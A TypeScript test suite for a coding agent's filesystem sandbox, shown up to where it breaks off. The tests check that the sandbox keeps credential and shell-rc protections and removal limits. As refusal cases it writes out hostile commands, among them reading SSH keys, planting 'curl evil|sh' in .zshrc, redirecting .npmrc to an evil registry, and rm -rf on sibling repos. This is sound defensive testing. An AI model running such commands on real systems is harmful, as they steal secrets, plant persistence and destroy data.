/**
 * The broad-write profile: write across home and temp, remove only where it is
 * disposable, and keep one fixed deny list. Policy compilation is unit-tested
 * on every platform; the real-kernel suite runs on the macOS Seatbelt and Linux
 * Bubblewrap confinement lanes.
 * @covers sandbox.broad-write
 * @level integration
 */
import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { existsSync, lstatSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import {
    buildSandboxCommand, compileWritePolicy, evaluateDeleteAccess, evaluateReadAccess, evaluateWriteAccess,
    isBroadWritePermissions, isRemovableUnderWrite, resetRecoverySnapshotClock, takeRecoverySnapshot,
    type SandboxPermissions, type SandboxSeams,
} from "./index.ts";

const broad: SandboxPermissions = {
    projectFiles: "read-write", outsideProject: "write", storedCredentials: "read",
    commands: true, network: true,
};

/**
 * A fixture home outside every temp root: a home under temp would make every
 * path in it removable and prove nothing about the home rules.
 */
function fixture(run: (paths: { base: string; home: string; project: string; sibling: string }) => void): void {
    const base = realpathSync(mkdtempSync(join(import.meta.dirname, ".broad-fixture-")));
    const home = join(base, "home");
    const project = join(home, "projects", "task");
    const sibling = join(home, "projects", "other-repo");
    mkdirSync(project, { recursive: true });
    mkdirSync(join(sibling, "src"), { recursive: true });
    writeFileSync(join(sibling, "README.md"), "keep me");
    writeFileSync(join(sibling, "src", "main.ts"), "export {};");
    const previousAgentDir = process.env.PI_CODING_AGENT_DIR;
    delete process.env.PI_CODING_AGENT_DIR;
    try {
        run({ base, home, project, sibling });
    } finally {
        if (previousAgentDir === undefined) delete process.env.PI_CODING_AGENT_DIR;
        else process.env.PI_CODING_AGENT_DIR = previousAgentDir;
        spawnSync("/bin/chmod", ["-R", "u+rwx", base]);
        rmSync(base, { recursive: true, force: true });
    }
}

describe("broad-write policy compilation", () => {
    it("selects the profile only for Outside project = Write", () => {
        assert.equal(isBroadWritePermissions(broad), true);
        assert.equal(isBroadWritePermissions({ ...broad, outsideProject: "read-write" }), false);
        assert.equal(isBroadWritePermissions({ ...broad, outsideProject: "read" }), false);
        fixture(({ home, project }) => {
            const legacy = compileWritePolicy({ writableRoot: project, home, permissions: { ...broad, outsideProject: "read-write" } });
            assert.equal(legacy.broad, undefined);
            assert.equal(legacy.permissions?.storedCredentials, "read");
        });
    });

    it("forces credentials off and decides write, read and removal per path", () => fixture(({ home, project, sibling }) => {
        const policy = compileWritePolicy({
            writableRoot: project, home, permissions: broad, denyWrite: [join(home, ".registry")],
        }, { platform: () => "darwin" });
        assert.equal(policy.permissions?.storedCredentials, "off", "the credential deny list is not optional");
        const darwin: SandboxSeams = { platform: () => "darwin" };
        const write = (path: string) => evaluateWriteAccess(path, policy, darwin).allowed;
        const remove = (path: string) => evaluateDeleteAccess(path, policy, darwin);
        assert.equal(write(join(sibling, "README.md")), true, "sibling repos stay writable in place");
        assert.equal(write(join(home, ".gradle", "wrapper", "x.lck")), true);
        assert.equal(write(join(home, ".ssh", "id_ed25519")), false);
        assert.equal(write(join(home, ".zshrc")), false);
        assert.equal(write(join(home, ".pi", "agent", "settings.json")), false);
        assert.equal(write(join(home, ".registry", "state.json")), false);
        assert.equal(write("/etc/hosts"), false, "writes stay inside home and temp");
        assert.equal(evaluateReadAccess(join(home, ".ssh", "id_ed25519"), policy).allowed, false);
        assert.equal(evaluateReadAccess(join(home, "Library", "Keychains", "login.keychain-db"), policy).allowed, false);
        assert.equal(evaluateReadAccess(join(home, ".zshrc"), policy).allowed, true, "code that runs later stays readable");
        assert.equal(remove(join(sibling, "README.md")).allowed, false);
        assert.deepEqual(remove(join(sibling, "README.md")), { allowed: false, path: join(sibling, "README.md"), reason: "delete-denied" });
        assert.equal(remove(sibling).allowed, false);
        assert.equal(remove(join(project, "build", "out.o")).allowed, true);
        assert.equal(remove(project).allowed, false, "the workspace root itself cannot be removed");
        assert.equal(remove(join(home, "projects")).allowed, false);
        assert.equal(remove(join(home, ".cache", "pip", "wheel")).allowed, true);
        assert.equal(remove(join(home, ".gradle", "caches", "8.14")).allowed, true);
        assert.equal(remove(join(home, ".gradle")).allowed, false, "~/.gradle holds init.d, which runs later");
        assert.equal(write(join(home, ".gradle", "init.d", "evil.gradle")), false);
        assert.equal(write(join(home, "projects", "other-repo", ".git", "hooks", "pre-commit")), true, "git hooks are not protected (ADR 0008)");
        assert.equal(write(join(home, "projects", "other-repo", ".git", "config")), true);
        assert.equal(write(join(home, ".local", "bin", "git")), false);
        assert.equal(evaluateReadAccess(join(home, ".gnupg", "private-keys-v1.d", "k.key"), policy).allowed, false);
        assert.equal(evaluateReadAccess(join(home, ".codex", "auth.json"), policy).allowed, false);
        assert.equal(remove(join(home, "projects", "repo-worktrees", "feature", "file")).allowed, true);
        assert.equal(remove(join(home, "projects", "repo", ".worktrees", "feature", "file")).allowed, true);
        assert.equal(remove(join(home, "projects", "repo-worktrees")).allowed, false, "only a worktree folder's contents");
        assert.equal(remove(join(home, ".config")).allowed, false, "an ancestor of a deny-list entry cannot move");
        assert.equal(remove("/private/tmp/scratch-file").allowed, true);
        const writeAndDelete = compileWritePolicy({ writableRoot: project, home, permissions: { ...broad, outsideProject: "read-write" } }, darwin);
        assert.equal(evaluateDeleteAccess(join(sibling, "README.md"), writeAndDelete, darwin).allowed, true);
    }));

    it("treats Project files = Write as writable but not removable, except worktree folders", () => fixture(({ home, project }) => {
        const darwin: SandboxSeams = { platform: () => "darwin" };
        for (const outsideProject of ["write", "read"] as const) {
            const policy = compileWritePolicy({ writableRoot: project, home,
                permissions: { ...broad, outsideProject, projectFiles: "write" } }, darwin);
            assert.equal(evaluateWriteAccess(join(project, "src", "a.ts"), policy, darwin).allowed, true, outsideProject);
            assert.equal(evaluateDeleteAccess(join(project, "src", "a.ts"), policy, darwin).allowed, false, outsideProject);
            assert.equal(evaluateDeleteAccess(join(project, ".worktrees", "b", "a.ts"), policy, darwin).allowed, true, outsideProject);
        }
        assert.throws(() => compileWritePolicy({ writableRoot: home, home, permissions: broad }), /not home itself/);
        assert.throws(() => buildSandboxCommand({
            profilePath: join(project, "p.sb"), execPath: "/bin/true", execArgs: [],
            policy: { writableRoot: project, home, permissions: { ...broad, projectFiles: "write" } },
        }, { platform: () => "linux", lookupExecutable: () => "/usr/bin/bwrap" }), /cannot separate removal/);
    }));

    it("answers removal for a symlink's own entry without resolving it", () => fixture(({ home, project, sibling }) => {
        const policy = compileWritePolicy({ writableRoot: project, home, permissions: broad }, { platform: () => "darwin" });
        assert.equal(isRemovableUnderWrite(join(home, ".nvm", "current"), policy), true);
        assert.equal(isRemovableUnderWrite(join(sibling, "link"), policy), false);
        assert.equal(isRemovableUnderWrite(join(home, ".pi", "agent"), policy), false, "the deny list wins over dot entries");
    }));

    it("starts a background recovery snapshot for Outside Write or Write & delete on macOS, rate-limited", async () => {
        resetRecoverySnapshotClock();
        const previous = process.env.PI_SANDBOX_RECOVERY_SNAPSHOT;
        delete process.env.PI_SANDBOX_RECOVERY_SNAPSHOT;
        try {
            let runs = 0;
            const run = async () => { runs++; return { ok: true, detail: "Created local snapshot" }; };
            const darwin = { platform: () => "darwin", run };
            assert.deepEqual(takeRecoverySnapshot({ ...broad, outsideProject: "read" }, darwin), { started: false, reason: "not-needed" });
            assert.deepEqual(takeRecoverySnapshot(broad, { platform: () => "linux", run }), { started: false, reason: "unsupported" });
            const first = takeRecoverySnapshot(broad, { ...darwin, now: () => 1_000 });
            assert.equal(first.started, true);
            assert.deepEqual(first.started && await first.done, { ok: true, detail: "Created local snapshot" });
            assert.deepEqual(takeRecoverySnapshot({ ...broad, outsideProject: "read-write" }, { ...darwin, now: () => 2_000 }),
                { started: false, reason: "rate-limited" });
            assert.equal(runs, 1);
            for (const failing of [async () => ({ ok: false, detail: "Operation not permitted" }),
                () => { throw new Error("spawn failed"); }, async () => { throw new Error("async failure"); }]) {
                resetRecoverySnapshotClock();
                const result = takeRecoverySnapshot(broad, { platform: () => "darwin", run: failing as () => Promise<{ ok: boolean; detail: string }> });
                assert.equal(result.started, true, "a failure never throws or blocks");
                assert.equal(result.started && (await result.done).ok, false);
            }
            process.env.PI_SANDBOX_RECOVERY_SNAPSHOT = "off";
            resetRecoverySnapshotClock();
            assert.deepEqual(takeRecoverySnapshot(broad, darwin), { started: false, reason: "not-needed" });
        } finally {
            if (previous === undefined) delete process.env.PI_SANDBOX_RECOVERY_SNAPSHOT;
            else process.env.PI_SANDBOX_RECOVERY_SNAPSHOT = previous;
            resetRecoverySnapshotClock();
        }
    });

    it("keeps ordinary Linux home folders read-only in the bubblewrap fallback", () => fixture(({ home, project, sibling }) => {
        const linux: SandboxSeams = { platform: () => "linux" };
        const policy = compileWritePolicy({ writableRoot: project, home, permissions: broad }, linux);
        assert.equal(evaluateWriteAccess(join(sibling, "README.md"), policy, linux).allowed, false);
        assert.equal(evaluateWriteAccess(join(home, ".cache", "x"), policy, linux).allowed, true);
        assert.equal(evaluateWriteAccess(join(project, "x"), policy, linux).allowed, true);
    }));

    it("orders the Seatbelt profile so the deny list overrides every grant", () => fixture(({ base, home, project }) => {
        let profile = "";
        buildSandboxCommand({
            profilePath: join(base, "p.sb"), execPath: "/bin/true", execArgs: [],
            policy: { writableRoot: project, home, permissions: broad, denyWrite: [join(home, ".registry")] },
        }, { platform: () => "darwin", writeProfile: (_path, contents) => { profile = contents; } });
        const at = (rule: string) => {
            const index = profile.indexOf(rule);
            assert.ok(index >= 0, `missing rule ${rule}\n${profile}`);
            return index;
        };
        const deny = at("(deny file-write-unlink)\n");
        assert.ok(at(`(allow file-write* (subpath "${home}"))`) < deny);
        assert.ok(deny < at(`(deny file-write* (subpath "${join(home, ".zshrc")}"))`));
        assert.ok(at(`(deny file-read* (subpath "${join(home, ".ssh")}"))`) > deny);
        assert.ok(at(`(deny file-write* (subpath "${join(home, ".registry")}"))`) > deny);
        assert.ok(at(`(deny file-write-unlink (literal "${home}"))`) > at(`(deny file-write* (subpath "${join(home, ".registry")}"))`));
    }));

    it("plans Linux mounts: read-only root, writable dot entries and workspace, masked credentials", () => fixture(({ base, home, project }) => {
        mkdirSync(join(home, ".cache"));
        mkdirSync(join(home, ".ssh"));
        mkdirSync(join(home, ".config", "gh"), { recursive: true });
        writeFileSync(join(home, ".zshrc"), "");
        mkdirSync(join(home, "projects", "repo-worktrees", "a"), { recursive: true });
        const mask = { directory: join(base, "mask-dir"), file: join(base, "mask-file") };
        const command = buildSandboxCommand({
            profilePath: join(base, "p.sb"), execPath: "/bin/true", execArgs: [],
            policy: { writableRoot: project, home, permissions: { ...broad, network: false } },
        }, { platform: () => "linux", lookupExecutable: () => "/usr/bin/bwrap", maskSources: () => mask, makeDirectory: () => {} });
        const argv = command.fileArgs;
        const mount = (option: string, source: string, path = source) =>
            argv.findIndex((arg, index) => arg === option && argv[index + 1] === source && argv[index + 2] === path);
        assert.deepEqual(argv.slice(0, 3), ["--ro-bind", "/", "/"]);
        assert.ok(mount("--bind", join(home, ".cache")) > 0);
        assert.ok(mount("--bind", project) > 0);
        assert.ok(mount("--bind", join(home, "projects", "repo-worktrees")) > 0);
        assert.equal(mount("--bind", join(home, "projects")), -1, "ordinary folders stay read-only");
        assert.ok(mount("--ro-bind", mask.directory, join(home, ".ssh")) > 0);
        assert.ok(mount("--ro-bind", mask.directory, join(home, ".config", "gh")) > mount("--bind", join(home, ".config")));
        assert.ok(mount("--ro-bind", join(home, ".zshrc")) > 0);
        assert.ok(argv.includes("--unshare-net"));
    }));

    /** The Linux plan as `[option, target, source]` rows, in mount order. */
    function linuxPlan(base: string, home: string, project: string): string[][] {
        const command = buildSandboxCommand({
            profilePath: join(base, "p.sb"), execPath: "/bin/true", execArgs: [],
            policy: { writableRoot: project, home, permissions: broad },
        }, {
            platform: () => "linux", lookupExecutable: () => "/usr/bin/bwrap", makeDirectory: () => {},
            maskSources: () => ({ directory: join(base, "mask-dir"), file: join(base, "mask-file") }),
        });
        const rows: string[][] = [];
        const argv = command.fileArgs;
        for (let i = 0; i < argv.length; i++) {
            if (["--bind", "--bind-try", "--ro-bind"].includes(argv[i]!)) rows.push([argv[i]!, argv[i + 2]!, argv[i + 1]!]);
        }
        return rows;
    }
    /** The option of the last mount at or above `path`: the one that decides it. */
    function decidingMount(rows: string[][], path: string): string | undefined {
        return rows.filter(([, target]) => path === target || path.startsWith(`${target}/`)).at(-1)?.[0];
    }

    it("keeps a stow link's directory writable on Linux except for new top-level entries", () => fixture(({ base, home, project }) => {
        mkdirSync(join(home, "dotfiles", ".config", "git"), { recursive: true });
        mkdirSync(join(home, ".config", "nvim"), { recursive: true });
        writeFileSync(join(home, ".config", "settings.json"), "{}");
        mkdirSync(join(home, ".ssh"));
        mkdirSync(join(home, ".cache"));
        symlinkSync("../dotfiles/.config/git", join(home, ".config", "git"));
        // A sibling link to a protected path must not become a writable bind.
        symlinkSync(join(home, ".ssh"), join(home, ".config", "evil"));
        const rows = linuxPlan(base, home, project);
        const config = join(home, ".config");
        assert.equal(decidingMount(rows, config), "--ro-bind", "the link's directory is read-only");
        assert.equal(decidingMount(rows, join(config, "new-tool")), "--ro-bind", "no new top-level entries");
        assert.equal(decidingMount(rows, join(config, "nvim", "init.lua")), "--bind-try");
        assert.equal(decidingMount(rows, join(config, "settings.json")), "--bind-try");
        assert.equal(rows.some(([, target]) => target === join(config, "git") || target === join(config, "evil")), false,
            "symlink entries are never bound");
        assert.deepEqual(rows.filter(([, target]) => target === join(config, "gh")), [["--ro-bind", join(config, "gh"), join(base, "mask-dir")]],
            "a protected sibling keeps only its mask");
        assert.equal(decidingMount(rows, join(home, ".cache", "x")), "--bind", "unrelated dot dirs are untouched");
    }));

    it("keeps ~/.local writable on Linux when ~/.local/bin is a mise shim link", () => fixture(({ base, home, project }) => {
        mkdirSync(join(home, ".local", "share", "mise", "shims"), { recursive: true });
        mkdirSync(join(home, ".local", "state"));
        symlinkSync(join(home, ".local", "share", "mise", "shims"), join(home, ".local", "bin"));
        const rows = linuxPlan(base, home, project);
        const local = join(home, ".local");
        assert.equal(decidingMount(rows, join(local, "new-dir")), "--ro-bind");
        assert.equal(decidingMount(rows, join(local, "state", "x")), "--bind-try");
        assert.equal(decidingMount(rows, join(local, "share", "x")), "--bind-try");
        assert.equal(decidingMount(rows, join(local, "share", "mise", "shims", "git")), "--ro-bind", "the link target stays protected");
    }));

    it("protects a looping hop inside a dot dir instead of failing the launch", () => fixture(({ base, home, project }) => {
        mkdirSync(join(home, ".cache", "pip"), { recursive: true });
        symlinkSync(join(home, ".cache", "l2"), join(home, ".cache", "l1"));
        symlinkSync(join(home, ".cache", "l1"), join(home, ".cache", "l2"));
        symlinkSync(join(home, ".cache", "l1"), join(home, ".zlogin"));
        const rows = linuxPlan(base, home, project);
        assert.equal(decidingMount(rows, join(home, ".cache", "l1")), "--ro-bind", "the loop's links cannot be replaced");
        assert.equal(decidingMount(rows, join(home, ".cache", "l2")), "--ro-bind");
        assert.equal(decidingMount(rows, join(home, ".cache", "pip", "wheel")), "--bind-try");
    }));

    it("locks the nearest existing ancestor of a dangling link's target on Linux, without placeholders", () => fixture(({ base, home, project }) => {
        mkdirSync(join(home, ".dotfiles"));
        writeFileSync(join(home, ".dotfiles", "aliases"), "");
        symlinkSync(join(home, ".dotfiles", "zshrc"), join(home, ".zshrc"));
        let rows = linuxPlan(base, home, project);
        assert.equal(decidingMount(rows, join(home, ".dotfiles", "zshrc")), "--ro-bind");
        assert.equal(decidingMount(rows, join(home, ".dotfiles", "aliases")), "--bind-try");
        assert.equal(existsSync(join(home, ".dotfiles", "zshrc")), false, "no placeholder in the user's dotfiles");
        // Missing parent too: home is read-only, so nothing is added.
        rmSync(join(home, ".dotfiles"), { recursive: true });
        rows = linuxPlan(base, home, project);
        assert.equal(decidingMount(rows, join(home, ".dotfiles", "zshrc")), undefined);
        // A dangling hop inside a dot dir no longer fails the launch.
        mkdirSync(join(home, ".cache"));
        mkdirSync(join(home, ".npm"));
        symlinkSync("../.npm/rc/zlogin", join(home, ".cache", "hop"));
        symlinkSync(join(home, ".cache", "hop"), join(home, ".zlogin"));
        rows = linuxPlan(base, home, project);
        assert.equal(decidingMount(rows, join(home, ".npm", "rc")), "--ro-bind");
        assert.equal(decidingMount(rows, join(home, ".cache", "hop")), "--ro-bind");
    }));
});

const macKernel = process.platform === "darwin" && existsSync("/usr/bin/sandbox-exec");
const linuxKernel = process.platform === "linux" &&
    spawnSync("bwrap", ["--ro-bind", "/", "/", "--", "/bin/true"]).status === 0;
const required = process.env.PI_SANDBOX_REQUIRE_BACKEND;
if ((required === "macos-seatbelt" && !macKernel) || (required === "linux-bubblewrap" && !linuxKernel)) {
    throw new Error(`PI_SANDBOX_REQUIRE_BACKEND=${required} but that backend is unavailable here.`);
}

describe("broad-write profile (real kernel)", { skip: !macKernel && !linuxKernel ? "requires Seatbelt or Bubblewrap" : false }, () => {
    function run(paths: { base: string; home: string; project: string }, script: string, permissions = broad, denyWrite: string[] = []) {
        const command = buildSandboxCommand({
            profilePath: join(paths.base, `profile-${Math.random().toString(36).slice(2)}.sb`),
            execPath: "/bin/sh", execArgs: ["-c", script],
            policy: { writableRoot: paths.project, home: paths.home, permissions, denyWrite },
        });
        return spawnSync(command.file, command.fileArgs, {
            cwd: paths.project, encoding: "utf8", env: { PATH: "/usr/bin:/bin", HOME: paths.home },
        });
    }
    const output = (result: ReturnType<typeof spawnSync>) => `${result.stdout ?? ""}${result.stderr ?? ""}`;

    it("lets a build use a user cache dir with no per-tool configuration", () => fixture((paths) => {
        const gradle = join(paths.home, ".gradle");
        mkdirSync(gradle);
        // Existing cache roots: the Linux fallback keeps home itself read-only,
        // so a brand-new top-level dot directory cannot be created there.
        mkdirSync(join(paths.home, ".cache"));
        const result = run(paths, [
            'mkdir -p "$HOME/.gradle/wrapper/dists/gradle-8.14.3-bin"',
            'cd "$HOME/.gradle/wrapper/dists/gradle-8.14.3-bin"',
            "printf lock > gradle-8.14.3-bin.zip.lck",
            "printf zip > gradle-8.14.3-bin.zip.part && mv gradle-8.14.3-bin.zip.part gradle-8.14.3-bin.zip",
            "rm gradle-8.14.3-bin.zip.lck",
            'mkdir -p "$HOME/.cache/tool" && printf ok > "$HOME/.cache/tool/entry" && rm -rf "$HOME/.cache/tool"',
            `cd '${paths.project}' && printf built > out.txt`,
        ].join(" && "));
        assert.equal(result.status, 0, output(result));
        assert.equal(readFileSync(join(gradle, "wrapper", "dists", "gradle-8.14.3-bin", "gradle-8.14.3-bin.zip"), "utf8"), "zip");
        assert.equal(existsSync(join(gradle, "wrapper", "dists", "gradle-8.14.3-bin", "gradle-8.14.3-bin.zip.lck")), false);
    }));

    it("refuses rm, rm -rf and mv of a sibling repo and keeps its data", () => fixture((paths) => {
        const readme = join(paths.sibling, "README.md");
        for (const script of [
            `rm '${readme}'`,
            `rm -rf '${paths.sibling}'`,
            `mv '${paths.sibling}' '${join(paths.home, ".cache-moved")}'`,
            `mv '${paths.sibling}' '${join(paths.project, "stolen")}'`,
            `mv '${readme}' '${join(paths.sibling, "renamed.md")}'`,
        ]) {
            const result = run(paths, script);
            assert.notEqual(result.status, 0, `${script} must be refused`);
            assert.equal(readFileSync(readme, "utf8"), "keep me", script);
            assert.equal(readFileSync(join(paths.sibling, "src", "main.ts"), "utf8"), "export {};", script);
        }
    }));

    it("edits a sibling repo in place on macOS; Linux keeps it read-only", () => fixture((paths) => {
        const file = join(paths.sibling, "src", "main.ts");
        const result = run(paths, `printf 'export const x = 1;' > '${file}'`);
        if (macKernel) {
            assert.equal(result.status, 0, output(result));
            assert.equal(readFileSync(file, "utf8"), "export const x = 1;");
        } else {
            assert.notEqual(result.status, 0, "the Linux fallback cannot separate removal from writing");
            assert.equal(readFileSync(file, "utf8"), "export {};");
        }
    }));

    it("allows removal in the workspace, temp, dot caches and worktree folders", () => fixture((paths) => {
        const worktree = join(paths.home, "projects", "other-repo-worktrees", "feature");
        mkdirSync(worktree, { recursive: true });
        mkdirSync(join(paths.home, ".npm"));
        writeFileSync(join(worktree, "file.txt"), "old");
        const temp = realpathSync(mkdtempSync(join(tmpdir(), "broad-temp-")));
        try {
            const result = run(paths, [
                "mkdir -p build/sub && printf x > build/sub/o && rm -rf build",
                `printf x > '${join(temp, "t")}' && rm '${join(temp, "t")}'`,
                'mkdir -p "$HOME/.npm/_cacache" && printf x > "$HOME/.npm/_cacache/i" && rm -rf "$HOME/.npm/_cacache"',
                // An atomic save: write a temp file and rename it over the original.
                `printf new > '${join(worktree, "file.txt.tmp")}' && mv '${join(worktree, "file.txt.tmp")}' '${join(worktree, "file.txt")}'`,
            ].join(" && "));
            assert.equal(result.status, 0, output(result));
            assert.equal(readFileSync(join(worktree, "file.txt"), "utf8"), "new");
            assert.equal(existsSync(join(paths.project, "build")), false);
        } finally {
            rmSync(temp, { recursive: true, force: true });
        }
    }));

    it("keeps deny-list paths unreadable or unwritable and harness state unwritable", () => fixture((paths) => {
        mkdirSync(join(paths.home, ".ssh"));
        writeFileSync(join(paths.home, ".ssh", "id_ed25519"), "synthetic-secret");
        writeFileSync(join(paths.home, ".zshrc"), "# rc");
        mkdirSync(join(paths.home, ".pi", "agent"), { recursive: true });
        const registry = join(paths.home, ".cache", "pi-better-subagents");
        mkdirSync(join(registry, "task-runtime"), { recursive: true });
        writeFileSync(join(registry, "task-runtime", "sa_1.json"), "{}");
        const secret = join(paths.home, ".ssh", "id_ed25519");
        const cases: [string, string][] = [
            [`cat '${secret}'`, "read a credential"],
            [`printf x > '${secret}'`, "write a credential"],
            [`printf x > '${join(paths.home, ".ssh", "authorized_keys")}'`, "create inside a credential dir"],
            [`printf 'curl evil' >> '${join(paths.home, ".zshrc")}'`, "append to a shell rc"],
            [`printf x > '${join(paths.home, ".pi", "agent", "extensions.ts")}'`, "plant agent code"],
            [`mv '${join(paths.home, ".pi")}' '${join(paths.home, ".pi-old")}'`, "move agent config away"],
            [`printf '{"forged":1}' > '${join(registry, "task-runtime", "sa_2.json")}'`, "forge provenance"],
            [`rm -rf '${registry}'`, "delete the registry"],
            // Seatbelt ranks a `file-write-unlink` rule above a `file-write*`
            // one, so these prove the deny list also outranks removal grants.
            [`rm -f '${secret}'`, "delete a credential inside a dot directory"],
            [`mv '${join(paths.home, ".ssh")}' '${join(paths.home, ".cache", "ssh")}'`, "move a credential dir"],
            [`mv '${join(paths.home, ".cache")}' '${join(paths.home, ".cache-old")}'`, "move a protected path's ancestor"],
        ];
        for (const [script, label] of cases) {
            const result = run(paths, script, broad, [registry]);
            assert.notEqual(result.status, 0, `${label} must be refused: ${output(result)}`);
            assert.doesNotMatch(result.stdout ?? "", /synthetic-secret/, label);
        }
        assert.equal(readFileSync(secret, "utf8"), "synthetic-secret");
        assert.equal(readFileSync(join(paths.home, ".zshrc"), "utf8"), "# rc");
        assert.equal(existsSync(join(registry, "task-runtime", "sa_2.json")), false);
        assert.equal(existsSync(join(registry, "task-runtime", "sa_1.json")), true);
        const readable = run(paths, `cat '${join(paths.home, ".zshrc")}'`);
        assert.equal(readable.status, 0, output(readable));
    }));

    it("refuses an atomic swap of a sibling repo with a disposable directory", { skip: !macKernel || !existsSync("/usr/bin/python3") }, () => fixture((paths) => {
        const disposable = join(paths.home, ".cache", "swap");
        mkdirSync(disposable, { recursive: true });
        // renamex_np(RENAME_SWAP) exchanges two entries in one call.
        const swap = (a: string, b: string) => `/usr/bin/python3 -c 'import ctypes,sys; sys.exit(0 if ctypes.CDLL(None).renamex_np(sys.argv[1].encode(), sys.argv[2].encode(), 2) == 0 else 1)' '${a}' '${b}'`;
        const other = join(paths.home, ".cache", "other");
        mkdirSync(other);
        const control = run(paths, swap(disposable, other));
        assert.equal(control.status, 0, `positive control: disposable entries can swap. ${output(control)}`);
        const result = run(paths, swap(paths.sibling, disposable));
        assert.notEqual(result.status, 0, output(result));
        assert.equal(readFileSync(join(paths.sibling, "README.md"), "utf8"), "keep me");
    }));

    it("keeps Project files = Write editable but not removable (macOS)", { skip: !macKernel }, () => fixture((paths) => {
        const permissions = { ...broad, projectFiles: "write" as const };
        writeFileSync(join(paths.project, "keep.txt"), "v1");
        const edit = run(paths, "printf v2 > keep.txt && printf new > added.txt", permissions);
        assert.equal(edit.status, 0, output(edit));
        assert.equal(readFileSync(join(paths.project, "keep.txt"), "utf8"), "v2");
        for (const script of ["rm keep.txt", "rm -rf .", "mv keep.txt moved.txt"]) {
            assert.notEqual(run(paths, script, permissions).status, 0, script);
            assert.equal(readFileSync(join(paths.project, "keep.txt"), "utf8"), "v2", script);
        }
    }));

    it("keeps the fixed deny list when dot entries are symlinks (stow/chezmoi layout)", () => fixture((paths) => {
        const { home } = paths;
        const dot = join(home, "dotfiles");
        mkdirSync(join(dot, "ssh"), { recursive: true });
        writeFileSync(join(dot, "ssh", "id_ed25519"), "synthetic-secret");
        writeFileSync(join(dot, "zshrc"), "# rc");
        writeFileSync(join(dot, "npmrc"), "//registry/:_authToken=synthetic");
        writeFileSync(join(dot, "gitconfig"), "[user]\n");
        mkdirSync(join(dot, "config", "gh"), { recursive: true });
        writeFileSync(join(dot, "config", "gh", "hosts.yml"), "synthetic");
        mkdirSync(join(dot, "pi", "agent"), { recursive: true });
        mkdirSync(join(home, ".cache"));
        mkdirSync(join(home, "state", "registry"), { recursive: true });
        writeFileSync(join(home, "state", "registry", "sa_1.json"), "{}");
        const links: [string, string][] = [["ssh", ".ssh"], ["zshrc", ".zshrc"], ["npmrc", ".npmrc"],
            ["gitconfig", ".gitconfig"], ["config", ".config"], ["pi", ".pi"]];
        for (const [target, name] of links) symlinkSync(join(dot, target), join(home, name));
        // Harness state reached through a symlink inside a removable dot directory.
        const registry = join(home, ".cache", "registry");
        symlinkSync(join(home, "state", "registry"), registry);
        const cases: [string, string][] = [
            [`rm '${home}/.zshrc' && printf 'curl evil|sh' > '${home}/.zshrc'`, "replace a symlinked rc"],
            [`rm '${home}/.ssh' && mkdir '${home}/.ssh' && printf x > '${home}/.ssh/config'`, "replace a symlinked credential dir"],
            [`mv '${home}/.pi' '${home}/.pi-old' && mkdir -p '${home}/.pi/agent'`, "move symlinked agent config away"],
            [`rm '${home}/.npmrc' && printf 'registry=https://evil/' > '${home}/.npmrc'`, "replace a symlinked credential file"],
            [`rm '${home}/.gitconfig' && printf '[core]\\n\\thooksPath=/tmp/x' > '${home}/.gitconfig'`, "replace symlinked git config"],
            [`rm '${home}/.config' && mkdir -p '${home}/.config/gh' && printf evil > '${home}/.config/gh/hosts.yml'`, "replace a symlinked ~/.config"],
            [`cat '${dot}/ssh/id_ed25519'`, "read a credential through its target"],
            [`printf evil >> '${dot}/zshrc'`, "append to an rc through its target"],
            [`rm '${registry}' && mkdir '${registry}' && printf forged > '${registry}/sa_1.json'`, "replace a symlinked registry"],
            [`printf forged > '${registry}/sa_1.json'`, "forge through a symlinked registry"],
        ];
        for (const [script, label] of cases) {
            const result = run(paths, script, broad, [registry]);
            assert.notEqual(result.status, 0, `${label} must be refused: ${output(result)}`);
            assert.doesNotMatch(result.stdout ?? "", /synthetic-secret/, label);
        }
        for (const [, name] of links) assert.equal(lstatSync(join(home, name)).isSymbolicLink(), true, name);
        assert.equal(lstatSync(registry).isSymbolicLink(), true);
        assert.equal(readFileSync(join(dot, "zshrc"), "utf8"), "# rc");
        assert.equal(readFileSync(join(home, "state", "registry", "sa_1.json"), "utf8"), "{}");
    }));

    it("protects the extended fixed list: GnuPG, Codex auth and user bin dirs", () => fixture((paths) => {
        const { home } = paths;
        mkdirSync(join(home, ".gnupg"));
        writeFileSync(join(home, ".gnupg", "secring"), "synthetic-secret");
        mkdirSync(join(home, ".codex"));
        writeFileSync(join(home, ".codex", "auth.json"), "synthetic-secret");
        mkdirSync(join(home, ".local", "bin"), { recursive: true });
        for (const [script, label] of [
            [`cat '${home}/.gnupg/secring'`, "read GnuPG"],
            [`cat '${home}/.codex/auth.json'`, "read Codex auth"],
            [`printf x > '${home}/.local/bin/git'`, "shadow a command in ~/.local/bin"],
        ] as const) {
            const result = run(paths, script);
            assert.notEqual(result.status, 0, `${label} must be refused: ${output(result)}`);
            assert.doesNotMatch(result.stdout ?? "", /synthetic-secret/, label);
        }
    }));

    it("follows every hop of a symlink chain: 2- and 3-hop file and directory links", () => fixture((paths) => {
        const { home } = paths;
        mkdirSync(join(home, ".dotfiles"));
        mkdirSync(join(home, ".stow", "inner"), { recursive: true });
        mkdirSync(join(home, "dotfiles", "ssh"), { recursive: true });
        writeFileSync(join(home, "dotfiles", "zshrc"), "# rc");
        writeFileSync(join(home, "dotfiles", "ssh", "id_ed25519"), "synthetic-secret");
        mkdirSync(join(home, ".cache"));
        mkdirSync(join(home, "state", "registry"), { recursive: true });
        writeFileSync(join(home, "state", "registry", "sa_1.json"), "{}");
        // 2 hops (file): ~/.zshrc -> ~/.dotfiles/zshrc -> ~/dotfiles/zshrc
        symlinkSync(join(home, "dotfiles", "zshrc"), join(home, ".dotfiles", "zshrc"));
        symlinkSync(join(home, ".dotfiles", "zshrc"), join(home, ".zshrc"));
        // 3 hops (directory, one relative): ~/.ssh -> ~/.dotfiles/ssh -> ../.stow/inner/ssh -> ~/dotfiles/ssh
        symlinkSync(join(home, "dotfiles", "ssh"), join(home, ".stow", "inner", "ssh"));
        symlinkSync("../.stow/inner/ssh", join(home, ".dotfiles", "ssh"));
        symlinkSync(join(home, ".dotfiles", "ssh"), join(home, ".ssh"));
        // 2 hops to harness state: ~/.cache/registry -> ~/.cache/hop -> ~/state/registry
        symlinkSync(join(home, "state", "registry"), join(home, ".cache", "hop"));
        const registry = join(home, ".cache", "registry");
        symlinkSync(join(home, ".cache", "hop"), registry);
        const cases: [string, string][] = [
